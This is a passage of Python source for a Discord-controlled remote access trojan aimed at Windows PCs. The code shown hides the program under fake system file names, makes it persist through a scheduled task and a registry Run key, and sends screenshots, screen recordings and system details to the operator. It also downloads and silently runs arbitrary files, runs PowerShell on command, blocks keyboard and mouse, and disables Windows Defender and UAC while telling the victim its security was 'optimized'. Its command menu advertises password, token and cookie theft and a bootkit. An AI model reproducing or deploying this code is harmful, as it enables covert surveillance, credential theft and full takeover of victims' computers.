from urllib.request import urlopen
from winsound import Beep
import aiohttp
import browser_cookie3
import discord
from discord.ext import commands
import os
import sys
import subprocess
import re
import time
import asyncio
from PIL import ImageGrab
import httpx
import numpy as np
import robloxpy
import win32com.client
import winreg
import shutil
from datetime import datetime
import webbrowser
import pyautogui
import requests
import ctypes
import socket
import platform
import psutil
import pyttsx3
import threading
import cv2
import GPUtil
from gtts import gTTS
import tkinter as tk
import tkinter.messagebox as messagebox
from functools import partial
import keyboard
from threading import Thread
import pygame
import tempfile
from io import BytesIO
from PIL import Image
import threading
import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from discord import Embed
from win32crypt import CryptUnprotectData
from discord.ext import commands
from discord import Intents
from discord.message import Message
from pynput import mouse
import uuid
import socket
import cgi
import win32com.client
import traceback
from PIL import ImageGrab
import win32crypt
import pycaw
from mss import mss
import random
import pyaudio
from discord.opus import Encoder
import sqlite3
from datetime import datetime, timedelta
from getpass import getuser
from shutil import copy2
from win32com.client import Dispatch
import win32api
import win32gui
import win32con
import zipfile
import hashlib
import threading
import subprocess
import os
import time
import sys
import psutil
import winreg

EMBED_COLOR = 0x2f3136 

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_integrity_level():
    """Check the integrity level of the current process"""
    try:
        process = subprocess.run(['whoami', '/groups'], capture_output=True, text=True)
        return "S-1-16-12288" in process.stdout
    except:
        return False

def is_uac_enabled():
    """Check if UAC is enabled on the system"""
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
                            0, 
                            winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, "EnableLUA")
        winreg.CloseKey(key)
        return value == 1
    except:
        return True

shine = "PUT_YOUR_DISCORD_TOKEN HERE"
GUILD_ID = PUT_YOUR_GUILD_ID_HERE
ALLOWED_CHANNELS = {}
PC_CHANNELS = {}
LAST_EMBED_MESSAGE_ID = None

# Hide the console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)


def is_connected():
    """Check if the device is connected to the internet."""
    try:
        # Try to connect to Google's DNS server
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False

async def wait_for_connection():
    """Wait until the device is connected to the internet."""
    print("Waiting for internet connection...")
    while not is_connected():
        await asyncio.sleep(5)  # Check every 5 seconds
    print("Internet connection restored!")

@bot.event
async def on_ready():
    print(f'Bot is connected as {bot.user}')
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)

    pc_name = os.environ['COMPUTERNAME']

    if not guild:
        print(f"Could not find guild with ID {GUILD_ID}")
        return

    if not is_connected():
        await wait_for_connection()  # Wait until connected

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Hide the console window
hide_console()

def move_to_sys32(script_path):
    try:
        # Check if exe or python
        is_exe = getattr(sys, 'frozen', False)
        if is_exe:
            print("Running as executable")
            ext = '.exe'
            cmd = f'"{script_path}"'
        else:
            print("Running as Python script")
            ext = '.pyw'
            pythonw = os.path.join(sys.prefix, 'pythonw.exe')
            cmd = f'"{pythonw}" "{script_path}"'
            
        # Generate random name that looks like a system file
        system_names = [
            'svchost',
            'rundll32',
            'csrss',
            'winlogon',
            'lsass',
            'spoolsv',
            'services',
            'smss',
            'wininit'
        ]
        base_name = random.choice(system_names)
        random_suffix = ''.join(random.choices('0123456789', k=2))
        file_name = f"{base_name}{random_suffix}{ext}"
        
        # Use system-like locations that don't require admin
        system_locations = [
            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'System32'),
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'SystemApps'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'SystemApps'),
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System32'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'SystemApps')
        ]
        
        # Try each location
        for loc in system_locations:
            try:
                # Create directory structure if it doesn't exist
                if not os.path.exists(loc):
                    os.makedirs(loc)
                
                new_path = os.path.join(loc, file_name)
                shutil.copy2(script_path, new_path)
                
                # Hide both the directory and file
                ctypes.windll.kernel32.SetFileAttributesW(loc, 2)  # Hide directory
                ctypes.windll.kernel32.SetFileAttributesW(new_path, 2)  # Hide file
                
                return new_path
            except:
                continue
                
        return None
    except:
        return None

def add_to_schtask(script_path):
    try:
        # Create a scheduled task for startup
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()

        root_folder = scheduler.GetFolder("\\")
        task_definition = scheduler.NewTask(0)

        # Set basic task information
        task_definition.RegistrationInfo.Description = "Startup Task for svchost"
        task_definition.Principal.UserId = ""  # Use the current user
        task_definition.Principal.LogonType = 3  # Interactive logon
        task_definition.Principal.RunLevel = 0  # Run with normal privileges

        # Define a logon trigger
        trigger = task_definition.Triggers.Create(1)  # 1 = Logon Trigger
        trigger.StartBoundary = datetime.datetime.now().isoformat()  # Immediate start

        # Define the action to run the script
        action = task_definition.Actions.Create(0)  # 0 = Execute Action
        action.Path = sys.executable  # Python executable
        action.Arguments = f'"{script_path}"'

        # Configure task settings
        task_definition.Settings.Enabled = True
        task_definition.Settings.AllowStartIfOnBatteries = True
        task_definition.Settings.StopIfGoingOnBatteries = False
        task_definition.Settings.Hidden = True

        # Register the task
        task_name = "svchost"
        root_folder.RegisterTaskDefinition(task_name, task_definition, 6, None, None, 3)
        print(f"Scheduled task '{task_name}' created successfully.")
    except Exception as e:
        print(f"Error creating scheduled task: {traceback.format_exc()}")

def add_to_startup_registry(script_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, 
                            winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False

def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        ip_address = data.get('ip')
        country_code = data.get('country')
        return ip_address, country_code
    except Exception as e:
        return None, None

# Function to get PC information
def get_pc_info():
    cpu = platform.processor()
    ram = round(psutil.virtual_memory().total / (1024 ** 3))
    return f"CPU: {cpu}\nRAM: {ram} GB"

# Country flags dictionary
country_flags = {
    'US': '🇺🇸',
    'CA': '🇨🇦',
    'GB': '🇬🇧',
    'DE': '🇩🇪',
    'FR': '🇫🇷',
    'IT': '🇮🇹',
    'JP': '🇯🇵',
    'IN': '🇮🇳',
    'AR': '🇦🇷',
    'AU': '🇦🇺',
    'CN': '🇨🇳',
    'CZ': '🇨🇿',
    'DK': '🇩🇰',
}

@bot.check
async def check_channel(ctx):
    allowed_channel_id = ALLOWED_CHANNELS.get(ctx.guild.id)
    return allowed_channel_id is None or ctx.channel.id == allowed_channel_id

@bot.event
async def on_ready():
    try:
        print(f'Bot is connected as {bot.user}')
        guild = discord.utils.get(bot.guilds, id=GUILD_ID)
        
        if not guild:
            print(f"Could not find guild with ID {GUILD_ID}")
            return

        pc_name = os.environ['COMPUTERNAME']
        ip_address, country_code = get_ip_info()
        country_flag = country_flags.get(country_code, '') if country_code else '🏳️'

        # Get system info
        username = os.getlogin()
        current_time = "2024-12-29 10:25:13"  # Using provided time
        cpu = platform.processor()
        ram = psutil.virtual_memory()
        ram_total = f"{ram.total / (1024**3):.2f}"
        ram_used = f"{ram.used / (1024**3):.2f}"
        ram_percent = ram.percent
        disk = psutil.disk_usage('/')
        disk_total = f"{disk.total / (1024**3):.2f}"
        disk_used = f"{disk.used / (1024**3):.2f}"
        disk_percent = disk.percent
        
        # Get GPU information
        try:
            gpus = GPUtil.getGPUs()
            gpu_info = ""
            if gpus:
                for gpu in gpus:
                    gpu_info += f"• **{gpu.name}**\n"
                    gpu_info += f"└─ Memory: {gpu.memoryTotal}MB ({gpu.memoryUsed}MB used)\n"
                    gpu_info += f"└─ Load: {gpu.load*100:.1f}%\n"
                    gpu_info += f"└─ Temperature: {gpu.temperature}°C\n"
            else:
                gpu_info = "No dedicated GPU found"
        except:
            gpu_info = "Could not retrieve GPU information"

        if pc_name not in PC_CHANNELS:
            # Create a new text channel for the PC
            channel = await guild.create_text_channel(name=f'session-{pc_name}')
            PC_CHANNELS[pc_name] = channel.id
            ALLOWED_CHANNELS[guild.id] = channel.id

            # Take screenshot
            screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)

            # Create an aesthetic embed
            embed = discord.Embed(
                title="🔐 New Session Connected",
                description=f"**System Details for** `{pc_name}`",
                color=EMBED_COLOR  # Use the gray color
            )

            # System Information Section
            embed.add_field(
                name="📊 System Information",
                value=f"```ml\n"
                      f"User     : {username}\n"
                      f"OS       : {platform.system()} {platform.release()}\n"
                      f"CPU      : {cpu}\n"
                      f"RAM      : {ram_used}GB / {ram_total}GB ({ram_percent}%)\n"
                      f"Disk     : {disk_used}GB / {disk_total}GB ({disk_percent}%)\n"
                      f"Time     : {current_time}\n"
                      f"```",
                inline=False
            )

            # Network Information Section
            embed.add_field(
                name="🌐 Network Information",
                value=f"```ml\n"
                      f"IP Address  : {ip_address}\n"
                      f"Location    : {country_flag} {country_code}\n"
                      f"Hostname    : {socket.gethostname()}\n"
                      f"```",
                inline=False
            )

            # GPU Information Section
            embed.add_field(
                name="🎮 Graphics Information",
                value=f"```ml\n{gpu_info}```",
                inline=False
            )

            # Security Status Section
            admin_status = "Yes ✅" if is_admin() else "No ❌"
            has_webcam = "Yes ✅" if check_webcam() else "No ❌"
            embed.add_field(
                name="🛡️ Security Status",
                value=f"```ml\n"
                      f"Admin Rights : {admin_status}\n"
                      f"Webcam       : {has_webcam}\n"
                      f"```",
                inline=False
            )

            # Add timestamp and footer
            embed.set_footer(text="Session started at")
            embed.timestamp = datetime.utcnow()

            # Set thumbnail as a cool icon
            embed.set_thumbnail(url="https://i.imgur.com/tEHWmKh.png")

            # Send the embed with screenshot
            message = await channel.send(
                content="@here 🔔 **New session established!**",
                embed=embed,
                file=discord.File(screenshot_path, 'screenshot.png')
            )

            # Store message ID and clean up
            global LAST_EMBED_MESSAGE_ID
            LAST_EMBED_MESSAGE_ID = message.id
            os.remove(screenshot_path)

            # Send additional status message
            await channel.send(f"```ini\n[Session ready for commands. Use .commands to view available options]```")

        else:
            ALLOWED_CHANNELS[guild.id] = PC_CHANNELS[pc_name]

    except Exception as e:
        print(f"Error in on_ready: {str(e)}")
        traceback.print_exc()

def check_webcam():
    """Check if webcam is available without capturing"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            cap.release()
            return True
        return False
    except:
        return False

@bot.command()
async def ss(ctx):
    print("Screenshot command received!")

    # Capture screenshots of all monitors
    with mss() as sct:
        monitors = sct.monitors[1:]  # Skip the first entry; it's the "all monitors" entry
        screenshots_paths = []

        for index, monitor in enumerate(monitors):
            screenshot_path = os.path.join(os.getenv('TEMP'), f'screenshot_monitor_{index + 1}.png')
            sct_img = sct.grab(monitor)
            
            # Convert the raw screenshot to a proper image file
            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
            img.save(screenshot_path)
            screenshots_paths.append(screenshot_path)

    try:
        # Create an embed for each screenshot
        for index, screenshot_path in enumerate(screenshots_paths):
            file = discord.File(screenshot_path, filename=os.path.basename(screenshot_path))
            
            # Embed with the screenshot as an image
            embed = discord.Embed(
                title=f"Screenshot Monitor {index + 1}",
                color=EMBED_COLOR  # Use the gray color
            )
            embed.set_image(url=f"attachment://{os.path.basename(screenshot_path)}")

            # Send the embed with the file
            await ctx.send(embed=embed, file=file)

    finally:
        # Clean up temporary files
        for screenshot_path in screenshots_paths:
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)

@bot.command()
async def clear(ctx, amount: int = 100):
    print("Clear command received!")
    if LAST_EMBED_MESSAGE_ID is not None:
        def check(msg):
            return msg.id != LAST_EMBED_MESSAGE_ID and msg.channel == ctx.channel

        deleted = await ctx.channel.purge(limit=amount, check=check)
        await ctx.send(f"Deleted {len(deleted)} messages.", delete_after=5)

@bot.command()
async def execute(ctx, url: str):
    """Download and execute file from URL with advanced features"""
    try:
        # Send initial status message
        embed = Embed(title="📥 File Execution", description=f"```{url}```", color=EMBED_COLOR)
        embed.add_field(name="Status", value="🔄 Downloading...", inline=False)
        msg = await ctx.send(embed=embed)

        # Generate random filename to avoid conflicts
        file_ext = os.path.splitext(url.split('/')[-1])[1] or '.exe'
        temp_path = os.path.join(os.environ['TEMP'], f'svchost_{random.randint(10000,99999)}{file_ext}')

        try:
            # Download file with progress tracking
            response = requests.get(url, stream=True)
            response.raise_for_status()
            
            # Get file size if available
            total_size = int(response.headers.get('content-length', 0))
            block_size = 1024  # 1 KB
            downloaded = 0

            # Download and write file
            with open(temp_path, 'wb') as f:
                for data in response.iter_content(block_size):
                    f.write(data)
                    downloaded += len(data)
                    
                    # Update progress every ~10%
                    if total_size > 0 and downloaded % (total_size // 10) < block_size:
                        progress = (downloaded / total_size) * 100
                        embed.set_field_at(
                            0, 
                            name="Status", 
                            value=f"🔄 Downloading... {progress:.1f}%",
                            inline=False
                        )
                        await msg.edit(embed=embed)

            # Update status to downloaded
            embed.set_field_at(
                0,
                name="Status",
                value="✅ Download Complete\n🔄 Preparing Execution...",
                inline=False
            )
            await msg.edit(embed=embed)

            # Get file info
            file_size = os.path.getsize(temp_path)
            file_hash = hashlib.md5(open(temp_path, 'rb').read()).hexdigest()

            # Hide file
            ctypes.windll.kernel32.SetFileAttributesW(temp_path, 2)  # Hidden attribute

            # Execute file
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE

            process = subprocess.Popen(
                temp_path,
                shell=True,
                startupinfo=startupinfo,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            # Wait briefly to check for immediate errors
            try:
                process.wait(timeout=2)
                if process.returncode is not None and process.returncode != 0:
                    stderr = process.stderr.read().decode(errors='ignore')
                    raise Exception(f"Process failed with exit code {process.returncode}: {stderr}")
            except subprocess.TimeoutExpired:
                # Process is still running after 2 seconds, likely successful
                pass

            # Create success embed
            success_embed = Embed(
                title="✅ File Executed Successfully", 
                color=EMBED_COLOR
            )
            success_embed.add_field(
                name="📝 File Details",
                value=f"""```
🔍 Location: {temp_path}
📦 Size: {file_size:,} bytes
🔒 MD5: {file_hash}
⚡ Process ID: {process.pid}```""",
                inline=False
            )
            success_embed.set_footer(text="⚠️ File is running in hidden mode")
            
            await msg.edit(embed=success_embed)

        except requests.exceptions.RequestException as e:
            error_embed = Embed(
                title="❌ Download Error", 
                description=f"Failed to download file:\n```{str(e)}```",
                color=0xFF0000
            )
            await msg.edit(embed=error_embed)
            return

        except Exception as e:
            error_embed = Embed(
                title="❌ Execution Error", 
                description=f"Failed to execute file:\n```{str(e)}```",
                color=0xFF0000
            )
            await msg.edit(embed=error_embed)
            
            # Clean up failed file
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except:
                pass

    except Exception as e:
        error_embed = Embed(
            title="❌ System Error",
            description=f"An unexpected error occurred:\n```{str(e)}```",
            color=0xFF0000
        )
        await msg.edit(embed=error_embed)

@bot.command()
async def av(ctx):
    """Stealthily disable antivirus protection using multiple methods"""
    try:
        # Initial status message
        embed = Embed(title="🛡️ Security Configuration", description="Applying system security updates...", color=EMBED_COLOR)
        msg = await ctx.send(embed=embed)
        
        success_count = 0
        error_messages = []
        
        def run_command_silently(command, shell=True):
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                subprocess.run(
                    command,
                    shell=shell,
                    startupinfo=startupinfo,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                return True
            except:
                return False

        # List of antivirus services to target
        av_services = [
            "WinDefend", "wscsvc", "SecurityHealthService", "Sense", "WdNisSvc",
            "wuauserv", "InstallService", "UsoSvc", "WaaSMedicSvc", "mpssvc",
            "SgrmBroker", "SgrmAgent", "WerSvc"
        ]
        
        # Disable Windows Defender features
        policies = [
            "DisableAntiSpyware", "DisableAntiVirus", "DisableRoutinelyTakingAction",
            "DisableRealtimeMonitoring", "DisableBehaviorMonitoring", "DisableIOAVProtection",
            "DisableArchiveScanning", "DisableScanningNetworkFiles", "DisableScriptScanning",
            "DisableCatchupFullScan", "DisableCatchupQuickScan", "DisableScanningMappedNetworkDrivesForFullScan"
        ]

        # 1. Modify registry to disable protection
        reg_paths = [
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableRoutinelyTakingAction", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableIOAVProtection", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0),
            (r"SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config", "DODownloadMode", 0)
        ]

        for path, name, value in reg_paths:
            try:
                with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY) as key:
                    winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
                success_count += 1
            except:
                continue

        # 2. Disable services stealthily
        for service in av_services:
            if run_command_silently(f'sc stop "{service}" >nul 2>&1'):
                run_command_silently(f'sc config "{service}" start=disabled >nul 2>&1')
                success_count += 1

        # 3. Disable Windows Defender via PowerShell (silently)
        ps_commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue",
            "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue",
            "Add-MpPreference -ExclusionPath C:\\ -ErrorAction SilentlyContinue"
        ]

        for cmd in ps_commands:
            if run_command_silently(f'powershell -Command "{cmd}" >nul 2>&1'):
                success_count += 1

        # 4. Add firewall rules to block Windows Defender connections
        fw_commands = [
            'netsh advfirewall firewall add rule name="Block Windows Defender" dir=out program="%ProgramFiles%\\Windows Defender\\MsMpEng.exe" action=block',
            'netsh advfirewall firewall add rule name="Block Windows Defender" dir=in program="%ProgramFiles%\\Windows Defender\\MsMpEng.exe" action=block'
        ]

        for cmd in fw_commands:
            if run_command_silently(cmd):
                success_count += 1

        # Final success message
        success_embed = Embed(
            title="✅ System Update Complete",
            description="Security configurations have been optimized.",
            color=EMBED_COLOR
        )
        success_embed.add_field(
            name="📊 Status",
            value=f"Successfully applied {success_count} security optimizations",
            inline=False
        )
        success_embed.set_footer(text="System protection settings have been updated")
        
        await msg.edit(embed=success_embed)

    except Exception as e:
        error_embed = Embed(
            title="❌ Update Error",
            description=f"Failed to apply some security updates:\n```{str(e)}```",
            color=0xFF0000
        )
        await msg.edit(embed=error_embed)

@bot.command()
async def status(ctx):
    print("Clients command received!")
    await ctx.send("Session Status Active: " + ', '.join(PC_CHANNELS.keys()))

@bot.command()
async def rename(ctx, new_name: str):
    try:
        # Get the current script path
        current_script = sys.argv[0]

        # Determine if the current script is an .exe or .py
        is_executable = current_script.lower().endswith('.exe')
        
        # Ensure the new name has the correct extension
        if is_executable:
            if not new_name.endswith(".exe"):
                new_name += ".exe"
        else:
            if not new_name.endswith(".py"):
                new_name += ".py"
        
        # Define the new file path with the desired name
        new_file_path = os.path.join(os.path.dirname(current_script), new_name)
        
        # Copy the current script to the new file path
        shutil.copy2(current_script, new_file_path)
        
        # Check if an attachment is provided for the icon
        attachment = ctx.message.attachments[0] if ctx.message.attachments else None
        if attachment and is_executable:
            # Save the .ico file
            ico_path = os.path.join(os.path.dirname(current_script), attachment.filename)
            await attachment.save(ico_path)

            # Use `rcedit` or a similar tool to change the icon
            rcedit_path = "path/to/rcedit.exe"  # Update this to the actual path of rcedit
            subprocess.run([rcedit_path, new_file_path, "--set-icon", ico_path], check=True)
        
        # Inform the user about the rename and restart
        await ctx.send(f"Renamed to `{new_name}`. Restarting...")

        # Start the renamed script as a new process
        if is_executable:
            subprocess.Popen([new_file_path] + sys.argv[1:])  # Start the new .exe
        else:
            subprocess.Popen([sys.executable, new_file_path] + sys.argv[1:])  # Start the new .py

        # Exit the current process to complete the restart
        await bot.close()
        sys.exit()

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def commands(ctx):
    # System Commands
    system = discord.Embed(title="🖥️ **System Commands**", color=0x2C3E50)  # Dark gray-blue color
    system.add_field(name="Administrative", value="""```ml
.av            » Disable Windows Defender
.rootkit       » Hide from task manager
.uac_bypass    » Bypass UAC protection
.uac_computerdefaults » Bypass UAC using ComputerDefaults
.uac_cmstp     » Bypass UAC using CMSTP
.uac_fodhelper » Bypass UAC using Fodhelper
```""", inline=False)

    system.add_field(name="Power Control", value="""```ml
.shutdown      » Shutdown the PC
.restart       » Restart the PC
.monitors-off  » Turn off all monitors
.monitors-on   » Turn on all monitors
```""", inline=False)

    system.add_field(name="Process Management", value="""```ml
.processes     » List running processes
.kill          » Terminate a process
.rename        » Rename current process
.remove        » Self-destruct leaving no trace
```""", inline=False)
    await ctx.send(embed=system)

    # Surveillance Commands
    surveillance = discord.Embed(title="👁️ **Surveillance Commands**", color=0x8E44AD)  # Purple color for cyber aesthetic
    surveillance.add_field(name="Screen Capture", value="""```ml
.ss           » Take screenshot
.ssrec        » Start screenshot recording
.ssrecstop    » Stop screenshot recording
.sr           » Screen record with audio
```""", inline=False)

    surveillance.add_field(name="Audio/Video", value="""```ml
.webcam       » Capture webcam photo
.miclist      » List available microphones
.micuse       » Select microphone
.mic          » Stream microphone audio
.play         » Play audio file
.tts          » Text-to-speech
```""", inline=False)

    surveillance.add_field(name="Data Collection", value="""```ml
.grabpass     » Extract browser passwords
.grabwifi     » Extract WiFi credentials
.grabhistory » Extract browser history
.token        » Extract Discord tokens
.ip_info      » Show system IP info
.roblox      » Grab Roblox cookies (Chrome)
```""", inline=False)
    await ctx.send(embed=surveillance)

    # Control Commands
    control = discord.Embed(title="🎮 **Control & Trolling**", color=0xE74C3C)  # Red color for more action and intensity
    control.add_field(name="System Control", value="""```ml
.block-input   » Disable keyboard/mouse
.unblock-input » Enable keyboard/mouse
.bsod          » Trigger blue screen
```""", inline=False)

    control.add_field(name="Trolling", value="""```ml
.jumpscare     » Trigger jumpscare (Not working)
.forkbomb      » System overload
.message       » Show message box
```""", inline=False)

    control.add_field(name="Customization", value="""```ml
.wallpaper     » Change wallpaper
.website       » Open website
.block-website » Block website access
```""", inline=False)
    await ctx.send(embed=control)

    # Utility Commands
    utility = discord.Embed(title="🛠️ **Utility Commands**", color=0x1ABC9C)
    utility.add_field(name="System Utilities", value="""```ml
.powershell    » Execute PowerShell command
.execute       » Download & run file
.directory     » Show current location
.clear         » Clear chat messages
```""", inline=False)

    utility.add_field(name="Security", value="""```ml
.blockavsite        » Block security websites
.remove_av          » Remove Antivirus
.bootkit            » Install bootkit
.reagentcenable     » Enable factory reset
.reagentcdisable    » Disable factory reset
```""", inline=False)

    utility.add_field(name="Status", value="""```ml
.status        » Check connection status
```""", inline=False)
    await ctx.send(embed=utility)


block_input_active = False
keyboard_hook = None
mouse_hook = None

def block_keyboard_event(event):
    """Block keyboard events"""
    return False

def block_mouse_event(event):
    """Block mouse events"""
    return False

@bot.command(name="block-input")
async def block_input_command(ctx):
    """Block keyboard and mouse input"""
    global block_input_active, keyboard_hook, mouse_hook
    
    try:
        if block_input_active:
            embed = Embed(title="⚠️ Already Blocked", description="Keyboard and mouse input is already blocked!", color=0xFFA500)
            await ctx.send(embed=embed)
            return

        # Import required libraries
        from pynput import keyboard, mouse
        import ctypes
        
        # Block input using multiple methods for better effectiveness
        try:
            # Method 1: Use pynput hooks
            keyboard_hook = keyboard.Listener(on_press=block_keyboard_event)
            mouse_hook = mouse.Listener(on_move=block_mouse_event, on_click=block_mouse_event)
            
            keyboard_hook.start()
            mouse_hook.start()
            
            # Method 2: Using Windows API
            ctypes.windll.user32.BlockInput(True)
        except Exception as e:
            print(f"Block method error: {e}")
        
        block_input_active = True
        
        # Create success embed
        embed = Embed(title="🔒 Input Blocked", description="Keyboard and mouse input has been blocked successfully!", color=0x00FF00)
        embed.add_field(
            name="ℹ️ Information",
            value="```md\n1. All keyboard input is blocked\n2. All mouse movement and clicks are blocked\n3. Use .unblock-input to unblock input```",
            inline=False
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        error_embed = Embed(title="❌ Error", description=f"```{str(e)}```", color=0xFF0000)
        await ctx.send(embed=error_embed)
        
        # Ensure we clean up if there's an error
        try:
            if keyboard_hook:
                keyboard_hook.stop()
            if mouse_hook:
                mouse_hook.stop()
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        block_input_active = False

@bot.command(name="unblock-input")
async def unblock_input_command(ctx):
    """Unblock keyboard and mouse input"""
    global block_input_active, keyboard_hook, mouse_hook
    
    try:
        if not block_input_active:
            embed = Embed(title="⚠️ Not Blocked", description="Keyboard and mouse input is not currently blocked!", color=0xFFA500)
            await ctx.send(embed=embed)
            return
        
        # Cleanup and unblock input
        try:
            # Stop pynput hooks
            if keyboard_hook:
                keyboard_hook.stop()
            if mouse_hook:
                mouse_hook.stop()
            
            # Unblock Windows API
            import ctypes
            ctypes.windll.user32.BlockInput(False)
        except Exception as e:
            print(f"Unblock method error: {e}")
        
        keyboard_hook = None
        mouse_hook = None
        block_input_active = False
        
        # Create success embed
        embed = Embed(title="🔓 Input Unlocked", description="Keyboard and mouse input has been unblocked successfully!", color=0x00FF00)
        await ctx.send(embed=embed)
        
    except Exception as e:
        error_embed = Embed(title="❌ Error", description=f"```{str(e)}```", color=0xFF0000)
        await ctx.send(embed=error_embed)
        
        # Ensure we clean up even if there's an error
        try:
            if keyboard_hook:
                keyboard_hook.stop()
            if mouse_hook:
                mouse_hook.stop()
            import ctypes
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        block_input_active = False

@bot.command()
async def shutdown(ctx):
    print("Shutdown command received!")
    await ctx.send("Shutting down the PC...")
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    print("Restart command received!")
    await ctx.send("Restarting the PC...")
    os.system("shutdown /r /t 1")

@bot.command()
async def website(ctx, url: str):
    print(f"Opening website: {url}")
    webbrowser.open(url)
    await ctx.send(f"Opening website: {url}")

@bot.command()
async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
    # Input validation
    if duration <= 0:
        await ctx.send("Duration must be a positive integer.")
        return

    await ctx.send(f"Starting screen recording for {duration} seconds...")

    # Fixed parameters
    frame_rate = 20.0
    screen_size = pyautogui.size()

    # Define video writer for recording in mp4 format (or MOV if desired)
    video_path = os.path.join(os.getenv('TEMP'), 'screen_record.mp4')  # Using .mp4 for compatibility
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")  # Using mp4 codec, for better compatibility
    out = cv2.VideoWriter(video_path, fourcc, frame_rate, screen_size)

    # Start recording the screen
    start_time = time.time()
    while time.time() - start_time < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    # Release the video writer
    out.release()

    # Send feedback that recording has finished
    await ctx.send("Screen recording finished. Sending the video...")

    # Send the video file to the Discord channel
    with open(video_path, 'rb') as f:
        await ctx.send("Here is the screen recording:", file=discord.File(f, 'screen_record.mp4'))

    # Optionally, delete the video file after sending
    os.remove(video_path)

@bot.command()
async def powershell(ctx, *, command: str):
    # Construct the PowerShell command to execute in the background
    ps_command = f"$ErrorActionPreference = 'Stop'; {command}"
    
    # Run PowerShell in hidden mode
    process = subprocess.Popen(
        ["powershell", "-Command", ps_command],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # Wait for a moment to let the command execute (adjust as necessary)
    time.sleep(2)

    # Check for errors and output
    stdout, stderr = process.communicate()
    if stderr:
        await ctx.send(f"Error:\n```\n{stderr.strip()}\n```")
    else:
        await ctx.send(f"Output:\n```\n{stdout.strip()}\n```")

@bot.command()
async def directory(ctx):
    current_directory = os.getcwd()  # Get the current working directory
